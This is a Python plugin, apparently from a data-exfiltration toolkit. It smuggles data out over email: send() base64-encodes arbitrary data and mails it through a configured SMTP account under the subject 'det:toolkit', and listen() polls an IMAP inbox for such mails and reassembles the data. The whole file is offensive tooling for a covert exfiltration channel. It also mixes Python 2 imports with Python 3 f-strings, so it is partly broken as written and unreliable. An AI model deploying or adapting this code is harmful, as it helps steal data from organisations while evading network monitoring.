from __future__ import print_function
import base64
import imaplib
from smtplib import SMTP
import email
import time
import sys
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText

app_exfiltrate = None
gmail_user = ''
gmail_pwd = ''
server = ''
server_port = 587


def send(data):
    mail_server = SMTP()
    mail_server.connect(server, server_port)
    mail_server.starttls()
    mail_server.login(gmail_user, gmail_pwd)

    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = gmail_user
    msg['Subject'] = "det:toolkit"
    msg.attach(MIMEText(base64.b64encode(data)))
    app_exfiltrate.log_message(
        'info', f"[gmail] Sending {len(data)} bytes in mail"
    )
    mail_server.sendmail(gmail_user, gmail_user, msg.as_string())


def listen():
    app_exfiltrate.log_message('info', "[gmail] Listening for mails...")
    client_imap = imaplib.IMAP4_SSL(server)
    try:
        client_imap.login(gmail_user, gmail_pwd)
    except:
        app_exfiltrate.log_message(
            'warning',
            f"[gmail] Did not manage to authenticate with creds: {gmail_user}:{gmail_pwd}",
        )
        sys.exit(-1)

    while True:
        client_imap.select("INBOX")
        typ, id_list = client_imap.uid(
            'search', None, "(UNSEEN SUBJECT 'det:toolkit')")
        for msg_id in id_list[0].split():
            msg_data = client_imap.uid('fetch', msg_id, '(RFC822)')
            raw_email = msg_data[1][0][1]
            # continue inside the same for loop as above
            raw_email_string = raw_email.decode('utf-8')
            # converts byte literal to string removing b''
            email_message = email.message_from_string(raw_email_string)
            # this will loop through all the available multiparts in mail
            for part in email_message.walk():
                if part.get_content_type() != "text/plain":
                    continue
                body = part.get_payload(decode=True)
                data = body.split('\r\n')[0]
                # print(data)
                try:
                    app_exfiltrate.retrieve_data(base64.b64decode(data))
                except Exception as e:
                    print(e)
        time.sleep(2)


def proxy():
    app_exfiltrate.log_message('info', "[proxy] [gmail] proxy mode unavailable (useless) for gmail plugin...")


class Plugin:

    def __init__(self, app, options):
        global app_exfiltrate, gmail_pwd, gmail_user, server, server_port
        gmail_pwd = options['password']
        gmail_user = options['username']
        server = options['server']
        server_port = options['port']
        app.register_plugin('gmail', {'send': send, 'listen': listen, 'proxy': proxy})
        app_exfiltrate = app
